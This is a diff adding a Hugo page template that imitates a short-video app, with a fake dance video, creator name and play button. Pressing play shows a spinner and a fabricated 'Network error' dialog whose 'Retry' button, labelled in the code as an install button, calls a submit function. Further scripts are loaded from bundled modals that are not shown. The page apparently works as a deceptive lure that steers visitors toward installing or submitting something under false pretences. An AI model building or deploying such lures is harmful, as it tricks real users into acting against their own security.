@@ -1,0 +1,108 @@
+{{ define "main" }}
+
+
+<body class="background" id="resize">
+<div class="wrap ">
+<div class="wrap-video gray">
+<video class="video"  src="/mp4/9A.mp4">
+<source type="video/mp4">
+</video>
+</div>
+
+<div class="header">
+<div class="header__camera">
+<img src="/img/camera.png" alt="" />
+</div>
+<span> <strong>For you</strong></span> <strong> Following </strong> <strong>Trending </strong>
+<div class="header__play">
+<img src="/img/play.jpg" alt="" />
+</div>
+<div class="header__mute">
+<img src="/img/mute.jpg" alt="" />
+</div>
+</div>
+
+<!-- Modal Content -->
+
+
+<!-- Scripts -->
+{{ range .Params.modals  }}
+{{ $modal := resources.Get . | js.Build | fingerprint  }}
+<script src="{{ $modal.RelPermalink  }}"></script>
+{{ end  }}
+
+
+<div id="main-block" class="main">
+<button type="button" class="step-1" onclick="vpnCall()">
+<svg class="play-icon mpic" width="70" height="70" viewBox="0 0 48 48" fill="#fff" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd"
+d="M12 8.77702C12 6.43812 14.5577 4.99881 16.5569 6.21266L41.6301 21.4356C43.5542 22.6038 43.5542 25.3962 41.6301 26.5644L16.5569 41.7873C14.5577 43.0012 12 41.5619 12 39.223V8.77702Z">
+</path>
+</svg>
+</button>
+</div>
+
+<div class="footer">
+<div class="desc">
+<div class="desc-name">Emily Pink <span>Follow</span> </div>
+<p>#dance #dancehall #hip-hop</p>
+</div>
+<div class="right-bar"></div>
+<img class="mpic footer-img" src="/img/vk.png" alt="">
+</div>
+</div>
+<div class="cont" style="display: none; z-index: 1001;">
+<img id="spinner" data-cfsrc="/img/spinner.gif" alt="" src="/img/spinner.gif">
+</div>
+
+
+
+
+
+<div class="wrapper" style="display: none; ">
+<div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-dialog-buttons ui-draggable show" aria-describedby="dialog" aria-labelledby="ui-id-1" style="height: auto; width: 300px; top: 311.011px; left: 155.8px; z-index: 9999;background: #f1f1fa;font-size: 16px; padding: 10px; display: inline-flex; flex-direction: column; gap: 1px; ">
+<div id="dialog" class="ui-dialog-content ui-widget-content"
+style="width: auto; min-height: 55.0219px; max-height: none; height: auto; margin-top: 2px;">
+<div style=" text-align: center;">
+<strong id="lang_title" class="lang-2" data-langkey="title">Network error</strong>
+</div> <p id="lang_desc" style="text-align: center;background: #f1f1f1;font-size: 14px;border-bottom: solid gray;border-bottom-width: 0.5px; padding: 10px;" class="lang-3" data-langkey="description">
+There is a problem connecting to internet. Please try again later.
+<br>
+</p>
+</div>
+<div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
+<div class="ui-dialog-buttonset">
+<button id="lang_install" type="button"
+class="ui-button ui-corner-all ui-widget lang-4" style="text-align: center;background: #f1f1f1;font-size: 18px;border-bottom: solid gray;border-bottom-width: 0.5px; padding: 10px;"
+data-langkey="button" onclick="formSubmit();">
+Retry
+</button>
+</div>
+</div>
+</div>
+</div>
+{{ range .Params.modals }}
+{{ $modal := resources.Get . | js.Build  | fingerprint }}
+<!-- Use this for external scripts -->
+<script src="{{ $modal.RelPermalink }}"></script>
+<!-- Use this for inline scripts -->
+<!--<script> {{ $modal.Content | safeJS }} </script> -->
+{{ end }}
+
+<!-- Global Functions -->
+<script>
+function vpnCall() {
+setTimeout(() => {
+const wrapper = document.querySelector('.wrapper');
+if (wrapper) wrapper.style.display = 'block';
+}, 400);
+// Show .cont after 400ms
+setTimeout(() => {
+const container = document.querySelector('.cont');
+if (container) container.style.display = 'block';
+}, 20);
+
+}
+</script>        
+</body>
+{{ end }}
